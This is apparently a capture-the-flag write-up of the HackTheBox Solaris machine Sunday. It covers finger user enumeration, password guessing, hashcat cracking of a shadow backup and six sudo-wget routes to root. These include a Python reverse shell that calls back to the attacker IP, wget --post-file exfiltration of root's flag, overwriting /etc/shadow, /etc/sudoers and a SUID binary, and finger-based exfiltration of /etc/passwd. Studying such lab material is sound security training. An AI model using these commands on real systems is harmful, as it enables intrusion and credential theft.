---
title: HTB: Sunday
url: https://0xdf.gitlab.io/2018/09/29/htb-sunday.html
date: 2018-09-29T10:51:30+00:00
difficulty: Easy [20]
tags: ctf, hackthebox, htb-sunday, finger, hashcat, sudo, wget, shadow, sudoers, gtfobins, arbitrary-write, oscp-like-v2, oscp-like-v1
---

Sunday is definitely one of the easier boxes on HackTheBox. It had a lot of fun concepts, but on a crowded server, they step on each other. We start by using finger to brute-force enumerate users, though once once person logs in, the answer is given to anyone working that host. I’m never a huge fan of asking people to just guess obvious passwords, but after that, there are a couple more challenges, including a troll that proves useful later, some password cracking, and a ton of neat opportunities to complete the final privesc using wget. I’ll show 6 ways to use wget to get root. Finally, in Beyond Root, I’ll explore the overwrite script being run by root, finger for file transfer, and execution without read.

## Box Info

| Name | [Sunday](https://hackthebox.com/machines/sunday)  [Sunday](https://hackthebox.com/machines/sunday) [Play on HackTheBox](https://hackthebox.com/machines/sunday) |
| --- | --- |
| Release Date | 28 Apr 2018 |
| Retire Date | 04 May 2024 |
| OS | Solaris Solaris |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Sunday |
| Radar Graph | Radar chart for Sunday |
| First Blood User | 01:02:32[m0noc m0noc](https://app.hackthebox.com/users/4365) |
| First Blood Root | 01:14:52[Adamm Adamm](https://app.hackthebox.com/users/2571) |
| Creator | [Agent22 Agent22](https://app.hackthebox.com/users/10931) |

## Recon

### nmap

nmap shows four ports open, including ssh on a non-standard port (22022), finger, and rpc with smserverd running. It also reveals Sunday is a Solaris host. This output was from when I initially solved Sunday. I’ll discuss how that changes the finger output in the next section.

```

root@kali# nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.76
Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-03 11:08 EDT
Warning: 10.10.10.76 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.76
Host is up (0.096s latency).
Not shown: 61176 filtered ports, 4355 closed ports
PORT      STATE SERVICE
79/tcp    open  finger
111/tcp   open  rpcbind
22022/tcp open  unknown
65258/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 140.89 seconds
root@kali# nmap -sV -sC -p 79,111,22022,65258 -oA nmap/scripts 10.10.10.76
Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-03 11:11 EDT
Nmap scan report for 10.10.10.76
Host is up (0.096s latency).

PORT      STATE SERVICE   VERSION
79/tcp    open  finger    Sun Solaris fingerd
| finger: Login       Name               TTY         Idle    When    Where\x0D
| sunny    sunny                 pts/1            Thu 14:52  10.10.14.245        \x0D
| sunny    sunny                 pts/2          4 Thu 13:55  10.10.15.182        \x0D
| sunny    sunny                 pts/4          2 Thu 13:55  10.10.16.94         \x0D
| sunny    sunny                 pts/5          8 Thu 14:52  10.10.15.42         \x0D
| sunny    sunny                 pts/6         21 Thu 14:14  10.10.14.120        \x0D
| sunny    sunny                 pts/7          2 Thu 14:32  10.10.15.138        \x0D
| sunny    sunny                 pts/8         49 Thu 14:20  10.10.15.167        \x0D
| sunny    sunny                 pts/9          9 Thu 14:28  10.10.14.122        \x0D
| sammy    sammy                 pts/10           Thu 15:07  10.10.14.78         \x0D
| sunny    sunny                 pts/11         1 Thu 15:06  10.10.16.73         \x0D
| sammy    sammy                 pts/12         4 Thu 14:44  10.10.15.38         \x0D
| sammy    sammy                 pts/13           Thu 15:10  10.10.15.182        \x0D
|_sammy    sammy                 pts/14         1 Thu 15:06  10.10.15.213        \x0D
111/tcp   open  rpcbind   2-4 (RPC #100000)
22022/tcp open  ssh       SunSSH 1.3 (protocol 2.0)
| ssh-hostkey:
|   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA)
|_  1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA)
65258/tcp open  smserverd 1 (RPC #100155)
Service Info: OS: Solaris; CPE: cpe:/o:sun:sunos

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.97 seconds

```

### finger

#### Overview

The [finger](https://en.wikipedia.org/wiki/Finger_protocol) daemon listens on port 79, and is really a relic of a time when computers were far too trusting and open. It provides status reports on logged in users. It can also provide details about a specific user and when they last logged in and from where.

#### Using finger

The finger nmap script returned a long list of logged in users, providing two user names, sunny and sammy. That said, if you look at this box on a non-crowded VIP server now, it’s certainly possible that there are no logged in users.

Running `finger @[ip]` will tell us of any currently logged in users:

```

root@kali# finger @10.10.10.76
No one logged on

```

This is the same command that the nmap script runs. So were that same scan run now, we would get an empty result (as opposed to seeing all the logins when I originally ran it).

finger can also check for details on a specific user. Try one that doesn’t exist:

```

root@kali# finger 0xdf@10.10.10.76
Login       Name               TTY         Idle    When    Where
0xdf                  ???

```

If the user does exist, information will come back. I’ll show that below once we find a user name.

#### Brute Force

If finger returns no logged in users, we can try to brute force usernames. We’ll use the [finger-user-enum.pl](http://pentestmonkey.net/tools/finger-user-enum/finger-user-enum-1.0.tar.gz) script from pentestmonkey.

```

root@kali# ./finger-user-enum.pl -U /opt/SecLists/Usernames/Names/names.txt -t 10.10.10.76
Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )
 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Worker Processes ......... 5
Usernames file ........... /opt/SecLists/Usernames/Names/names.txt
Target count ............. 1
Username count ........... 10163
Target TCP port .......... 79
Query timeout ............ 5 secs
Relay Server ............. Not used

######## Scan started at Thu Sep 27 17:39:02 2018 #########
access@10.10.10.76: access No Access User                     < .  .  .  . >..nobody4  SunOS 4.x NFS Anonym               < .  .  .  . >..
admin@10.10.10.76: Login       Name               TTY         Idle    When    Where..adm      Admin                              < .  .  .  . >..lp       Line Printer Admin                 < .  .  .  . >..uucp     uucp Admin                         < .  .  .  . >..nuucp    uucp Admin                         < .  .  .  . >..dladm    Datalink Admin                     < .  .  .  . >..listen   Network Admin                      < .  .  .  . >..
anne marie@10.10.10.76: Login       Name               TTY         Idle    When    Where..anne                  ???..marie                 ???..
bin@10.10.10.76: bin             ???                         < .  .  .  . >..
dee dee@10.10.10.76: Login       Name               TTY         Idle    When    Where..dee                   ???..dee                   ???..
jo ann@10.10.10.76: Login       Name               TTY         Idle    When    Where..jo                    ???..ann                   ???..
la verne@10.10.10.76: Login       Name               TTY         Idle    When    Where..la                    ???..verne                 ???..
line@10.10.10.76: Login       Name               TTY         Idle    When    Where..lp       Line Printer Admin                 < .  .  .  . >..
message@10.10.10.76: Login       Name               TTY         Idle    When    Where..smmsp    SendMail Message Sub               < .  .  .  . >..
miof mela@10.10.10.76: Login       Name               TTY         Idle    When    Where..miof                  ???..mela                  ???..
sammy@10.10.10.76: sammy                 pts/2        <Sep 27 13:55> 10.10.16.26         ..
sunny@10.10.10.76: sunny                 pts/3        <Apr 24 10:48> 10.10.14.4          ..
sys@10.10.10.76: sys             ???                         < .  .  .  . >..
zsa zsa@10.10.10.76: Login       Name               TTY         Idle    When    Where..zsa                   ???..zsa                   ???..
######## Scan completed at Thu Sep 27 17:44:39 2018 #########
14 results.

10163 queries in 337 seconds (30.2 queries / sec)

```

There’s some garbage in there, but two interesting usernames:

```

sammy@10.10.10.76: sammy                 pts/2        <Sep 27 13:55> 10.10.16.26         ..
sunny@10.10.10.76: sunny                 pts/3        <Apr 24 10:48> 10.10.14.4          ..

```

Now we can compare the results of finger for a name that exists and one that doesn’t:

```

root@kali# finger 0xdf@10.10.10.76
Login       Name               TTY         Idle    When    Where
0xdf                  ???
root@kali# finger sunny@10.10.10.76
Login       Name               TTY         Idle    When    Where
sunny    sunny                 pts/2            Fri 11:06  10.10.14.5

```

## User Shell - SSH As sunny

With two known accounts, and ssh, it’s worth guessing a few passwords. I always try admin, root, the box name, and any defaults for the application. Turns out sunny/sunday works:

```

root@kali# ssh -p 22022 sunny@10.10.10.76
Password:
Last login: Thu May  3 15:25:35 2018 from 10.10.14.12
Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
sunny@sunday:~$ pwd
/export/home/sunny
sunny@sunday:~$ id
uid=65535(sunny) gid=1(other) groups=1(other)

```

## Privesc: sunny to sammy

### Find Backup shadow

Inside `/backup` there’s a copy of a `shadow` file that is world readable:

```

sunny@sunday:/backup$ ls -l
total 2
-r-x--x--x 1 root root  53 2018-04-24 10:35 agent22.backup
-rw-r--r-- 1 root root 319 2018-04-15 20:44 shadow.backup

sunny@sunday:/backup$ cat shadow.backup
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::

```

### Break with hashcat

Pulling back shadow.backup and the passwd file, and after using unshadow to create an unshadow file, john or hashcat can break both hashes. Here’s what the hashcat output looks like (with status messages cleaned out):

```

$ hashcat -m 7400 sunday.hashes /usr/share/wordlists/rockyou.txt --force
...[snip]...
$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:sunday
$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:cooldude!
...[snip]...

```

### User Shell - SSH as sammy / user.txt

Armed with sammy’s password, it is now possible to ssh in as sammy:

```

root@kali# ssh -p 22022 sammy@10.10.10.76
Password:
Last login: Sat May  5 20:06:34 2018 from 10.10.14.112
Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
sammy@sunday:~$

```

sammy has access to user.txt:

```

sammy@sunday:~$ wc -c Desktop/user.txt
33 Desktop/user.txt

sammy@sunday:~$ cat Desktop/user.txt
a3d94980...

```

## Privesc: sammy to root

### Enumeration

In enumerating as sammy, I see that sammy can sudo wget without password (either in [LinEnum.sh](https://github.com/rebootuser/LinEnum) output or from checking `sudo -l`).

### 6 Methods to root Using wget

There’s a ton of things we can do from here. Reading the [wget man page](https://linux.die.net/man/1/wget) provides a wealth of ideas. I’ll show six examples.

#### –input-file

The easiest way to just get the flag is to take advantage of the `--input-file` or `-i` flag on wget. This flag allows you to provide a file with the urls to visit. When it reads the hash, the string will fail to process as a url, and will tell us so in an error message, complete with flag:

```

sammy@sunday:~$ sudo wget --input-file /root/root.txt
/root/root.txt: Invalid URL fb40fab6...: Unsupported scheme
No URLs found in /root/root.txt.

```

#### Post Flag

A second method to exfil the flag is to have wget post the file back to us using `--post-file`. Unfortunately, python SimpleHTTPServer doesn’t support POST requests:

```

root@kali# python3 -m http.server 443
Serving HTTP on 0.0.0.0 port 443 (http://0.0.0.0:443/) ...
10.10.10.76 - - [27/Sep/2018 20:57:17] code 501, message Unsupported method ('POST')
10.10.10.76 - - [27/Sep/2018 20:57:17] "POST / HTTP/1.0" 501 -

```

However, in this, case I only need to read the POST, not respond to it, so a simple `nc` will work:

```

sammy@sunday:~$ sudo wget --post-file /root/root.txt http://10.10.14.5:443/
--00:52:35--  http://10.10.14.5:443/
           => `index.html'
Connecting to 10.10.14.5:443... connected.
HTTP request sent, awaiting response...

```

```

root@kali# nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.76] 49337
POST / HTTP/1.0
User-Agent: Wget/1.10.2
Accept: */*
Host: 10.10.14.5:443
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

fb40fab6...

```

#### Overwrite troll

Enough just getting the flag. I obviously want a root shell.

This was actually how I first solved the box. When enumerating as sunny, I found a binary named troll that sunny could run with sudo without password:

```

sunny@sunday:~$ sudo -l
User sunny may run the following commands on this host:
    (root) NOPASSWD: /root/troll

sunny@sunday:~$ sudo /root/troll
testing
uid=0(root) gid=0(root)

```

There’s nothing we could do with this as sunny. However, I think the box author expects us to use this file to privesc (hence the [overwrite script](#overwrite)).

So let’s make troll useful. First, on kali, create a shell.py, which is basically a nicely formatted [reverse python shell from pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet):

```

#!/usr/bin/python

import socket
import subprocess
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.5",443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"]);

```

Serve it with SimpleHTTPServer, and request `shell.py` with wget, using the `-O` option, which will allow us to specify a file to write the wget output to, and it will overwrite that file if it already exists:

```

sammy@sunday:~$ sudo wget http://10.10.14.5/shell.py -O /root/troll
--01:07:04--  http://10.10.14.5/shell.py
           => `/root/troll'
Connecting to 10.10.14.5:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 246 [text/plain]

100%[==========================================================================================================================================================================================================>] 246           --.--K/s

01:07:04 (25.59 MB/s) - `/root/troll' saved [246/246]

```

```

root@kali# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.76 - - [27/Sep/2018 21:11:58] "GET /shell.py HTTP/1.0" 200 -

```

Run it with sunny:

```

sunny@sunday:~$ sudo /root/troll

```

And get callback:

```

root@kali# nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.76] 56164
root@sunday:~# id
uid=0(root) gid=0(root) groups=0(root),1(other),2(bin),3(sys),4(adm),5(uucp),6(mail),7(tty),8(lp),9(nuucp),12(daemon)

```

This is a bit trickier to pull off than it one might think at first, if you aren’t quick *and* lucky. That’s because of the `overwrite` script resetting `troll` to it’s original self every 5 seconds. Check out the [Beyond Root](#overwrite) section where I’ll look at detecting this. But for the sake of making it work, have the windows close together and run `wget` as sammy immediately followed by `troll` as sunny.

Here’s how I did it, with SimpleHTTPServer in the top window, then sammy SSH, then sunny SSH, and then nc listener to catch root shell:

![1538099855160](https://0xdfimages.gitlab.io/img/sunday-troll-priv.gif)

#### Overwrite Different SUID Binary

If catching troll before it reverts was too much, it’s certainly easier to just overwrite a different set uid binary. Just make a backup copy of the original first, so you can put it back after exploiting. For example, `/usr/bin/passwd`:

```

sammy@sunday:~$ cp /usr/bin/passwd /tmp
sammy@sunday:~$ ls -la /usr/bin/passwd
-r-sr-sr-x 1 root sys 31584 2009-05-14 21:18 /usr/bin/passwd
sammy@sunday:~$ sudo wget -O /usr/bin/passwd http://10.10.14.5/shell.py
--02:09:34--  http://10.10.14.5/shell.py
           => `/usr/bin/passwd'
Connecting to 10.10.14.5:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 246 [application/octet-stream]

100%[==========================================================================================================================================================================================================>] 246           --.--K/s

02:09:34 (69.91 KB/s) - `/usr/bin/passwd' saved [246/246]

sammy@sunday:~$ passwd

```

```

root@kali# nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.76] 41346
# id
uid=101(sammy) gid=10(staff) euid=0(root) egid=3(sys) groups=10(staff)

```

#### Overwrite shadow

Overwriting `/etc/passwd` and/or `/etc/shadow` seemed to be the most common attempt to root this box, and it ended up with a lot of people screwing up the box and making it unusable. In fact, it led to people trying to do the finger enumeration in the initial stage and getting nothing back because the user list was jacked up.

In general, there are just better ways to do this. That said, if you want to go this route, here’s one way how.

Since we already have the shadow backup file, we’ll use that. It doesn’t have a root entry at the top, but let’s add one:

```

root:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::

```

In this case, I’ve made the root entry the same as sunny, other than the username.

Then get it with wget, and then su and give it password “sunday”:

```

sammy@sunday:~$ sudo wget -O /etc/shadow http://10.10.14.5/shadow
--02:00:10--  http://10.10.14.5/shadow
           => `/etc/shadow'
Connecting to 10.10.14.5:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 392 [application/octet-stream]

100%[==========================================================================================================================================================================================================>] 392           --.--K/s

02:00:10 (42.45 MB/s) - `/etc/shadow' saved [392/392]

sammy@sunday:~$ su -
Password:
Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
You have new mail.
root@sunday:~# id
uid=0(root) gid=0(root) groups=0(root),1(other),2(bin),3(sys),4(adm),5(uucp),6(mail),7(tty),8(lp),9(nuucp),12(daemon)

```

If I had wanted to give root a different password, and not just copy from sunny or sammy, I could use openssl:

```

root@kali# openssl passwd -1 -salt 0xdf password
$1$0xdf$fKKvgEPPSu1HMdNI3w5i50

```

Then put that into shadow:

```

root@kali# head -1 shadow
root:$1$0xdf$fKKvgEPPSu1HMdNI3w5i50:17636::::::

```

And now I can `su` with the password “password”.

#### Overwrite sudoers

The `/etc/sudoers` file defines who can run sudo on which applications. We can estimate that, without comments, the unmodified file on Sunday looks something like:

```

root  ALL=(ALL) ALL
sammy ALL=(root) NOPASSWD: /usr/bin/wget
sunny ALL=(root) NOPASSWD: /root/troll

```

Let’s change that slightly in a copy on our local host, giving sammy the ability to run `su` without password:

```

root  ALL=(ALL) ALL
sammy ALL=(root) NOPASSWD: /usr/bin/su
sunny ALL=(root) NOPASSWD: /root/troll

```

Now, use wget to overwrite the file on Sunday, and then it is easy to get a root shell:

```

sammy@sunday:~$ sudo wget -O /etc/sudoers http://10.10.14.5/sudoers
--02:07:08--  http://10.10.14.5/sudoers
           => `/etc/sudoers'
Connecting to 10.10.14.5:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 99 [application/octet-stream]

100%[==========================================================================================================================================================================================================>] 99            --.--K/s

02:07:08 (15.45 MB/s) - `/etc/sudoers' saved [99/99]

sammy@sunday:~$ sudo -l
User sammy may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/su
sammy@sunday:~$ sudo su
root@sunday:~# id
uid=0(root) gid=0(root)

```

## Beyond Root

### overwrite

#### What Is It

With a root shell, I found the `overwrite` script in the root home directory.

```

#!/usr/bin/bash

while true; do
        /usr/gnu/bin/cat /root/troll.original > /root/troll
        /usr/gnu/bin/sleep 5
done

```

It is consistent with the experience that troll is set back to it’s default state regularly to suspect that the script is running on the box. Further, it does show up in the processes list:

```

sammy@sunday:/tmp$ ps awux | grep overwrite
root       499  0.1  0.2 6204 2420 ?        S 01:41:01  0:09 /usr/bin/bash /root/overwrite

```

#### What Is It Doing

Without root access, how can we figure out what `overwrite` is doing?

I tried to compile [pspy](https://github.com/DominicBreuker/pspy) for solaris, but wasn’t able to get it to work. If you know how, please leave a comment.

So I dropped back to the bash process monitor that I’ve seen in [ippsec videos](https://youtu.be/K9DKULxSBK4?t=31m30s) and [OSCP notes](https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html#scripts). I had to change a couple things to to get it working on Solaris. I also reduced the sleep time, and added the pid output to the ps command so that if the same command runs over and over, we’d still see that change :

```

sammy@sunday:/tmp$ cat pm.sh
#!/bin/bash

# Loop by line
IFS=$'\n'

old_process=$(ps -eo args -o pid)

while true; do
        new_process=$(ps -eo args -o pid)
        diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>] | grep -v "ps -eo args"
        sleep .1
        old_process=$new_process
done

```

Running this will show a new `sleep 5` running every 5 seconds, as the pid of the sleep process changes:

```

sammy@sunday:/tmp$ ./pm.sh
< /usr/gnu/bin/sleep 5                                                             14430
> /usr/gnu/bin/sleep 5                                                             14453
< /usr/gnu/bin/sleep 5                                                             14453
> /usr/gnu/bin/sleep 5                                                             14486
< /usr/gnu/bin/sleep 5                                                             14486
> /usr/gnu/bin/sleep 5                                                             14524
< /usr/gnu/bin/sleep 5                                                             14524
> /usr/gnu/bin/sleep 5                                                             14557
< /usr/gnu/bin/sleep 5                                                             14557
> /usr/gnu/bin/sleep 5                                                             14597

```

Waiting for a while, we’ll occasionally see something like this:

```

< /usr/gnu/bin/sleep 5                                                             15283
> /usr/gnu/bin/sleep 5                                                             15319
< /usr/gnu/bin/sleep 5                                                             15319
> <defunct>                                                                        15355
< <defunct>                                                                        15355
> /usr/gnu/bin/sleep 5                                                             15357
< /usr/gnu/bin/sleep 5                                                             15357
> <defunct>                                                                        15393
< <defunct>                                                                        15393
> /usr/gnu/bin/sleep 5                                                             15394
< /usr/gnu/bin/sleep 5                                                             15394
> <defunct>                                                                        15429
< <defunct>                                                                        15429
> /usr/gnu/bin/sleep 5                                                             15431
< /usr/gnu/bin/sleep 5                                                             15431
> /usr/gnu/bin/sleep 5                                                             15467

```

If the script gets lucky with its timing, it will catch sleep dropping out of the process list and `<defunct>` being added, then immediately after it goes back to sleep. The `<defunct>` tag is assigned to zombie processes, who’s parent has not yet fully terminated them. In some cases, these processes linger around. In this case, it’s just our catching the process just after it completes but before it’s cleanly exited. Because it’s already terminated, we don’t get the command line. Still, we now know that something is running a very fast command (or maybe commands) and then sleeping for 5 seconds.

This is the best I was able to achieve as far as determining what `overwrite` was doing with only sammy access. If you have better ideas, I’d love to hear them in the comments.

### finger for File Transfer

While working on this post, I was checking out [gtfobins](https://gtfobins.github.io/), and their page on finger shows how it can be used for file transfer. For example, to exfil the password file from Sunday, with the listener started locally:

```

root@sunday:~# finger "$(base64 /etc/passwd)"@10.10.14.5
[10.10.14.5]

```

```

root@kali# nc -lnvp 79 | base64 -d > passwd
listening on [any] 79 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.76] 54768

root@kali# cat passwd
root:x:0:0:Super-User:/root:/usr/bin/bash
daemon:x:1:1::/:
...[snip]...

```

You can upload files to a target machine as well:

```

root@kali# cat shell.py | base64 | nc -lp 79

```

```

root@sunday:~# finger x@10.10.14.5 > shell.b64

```

The resulting file in this case had some IP info, separated with a newline, but we can clean that up:

```

root@sunday:~# cat  shell.b64
[10.10.14.5]
IyEvdXNyL2Jpbi9weXRob24KCmltcG9ydCBzb2NrZXQKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IG9zCgpzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm
5lY3QoKCIxMC4xMC4xNC41Iiw0NDMpKQpvcy5kdXAyKHMuZmlsZW5vKCksMCkKb3MuZHVwMihzLmZpbGVubygpLDEpCm9zLmR1cDIocy5maWxlbm8oKSwyKQpwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2gi
LCItaSJdKTsK

root@sunday:~# cat  shell.b64 | head -2 | tail -1 | base64 -d
#!/usr/bin/python

import socket
import subprocess
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.5",443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"]);

```

### agent22

#### Discovery

When on as sunny, I noticed a second file in the `/backup` directory next to the shadow backup:

```

sunny@sunday:/backup$ ls -l
total 2
-r-x--x--x 1 root root  53 2018-04-24 10:35 agent22.backup
-rw-r--r-- 1 root root 319 2018-04-15 20:44 shadow.backup

```

And while we don’t have permission to read the file, we can try to run it:

```

sunny@sunday:/backup$ ./agent22.backup
/usr/bin/bash: ./agent22.backup: Permission denied

```

#### Permissions Issues

So why permission denied? It comes down to what is happening when `./program` is run. If that program is a binary (ie, elf), first the kernel checks if the current user has permission to execute the file, and then the file is read by the kernel and loaded into memory by the kernel.

However, in the case of interpreted scripts (python, perl, bash, sh, etc), it is the interpreter that is loaded by the kernel, as the current user, and then that interpreter tries to read the files contents and run them. But, in this case, since the interpreter, running as sunny, doesn’t have read permissions on the file, it is denied.

#### What Is It

With a root shell, we discover that this is actually just a backup copy of troll:

```

root@sunday:/backup# cat agent22.backup
#!/usr/bin/bash

/usr/bin/echo "testing"
/usr/bin/id

```

```

root@sunday:/# diff -s /root/troll /backup/agent22.backup
Files /root/troll and /backup/agent22.backup are identical

```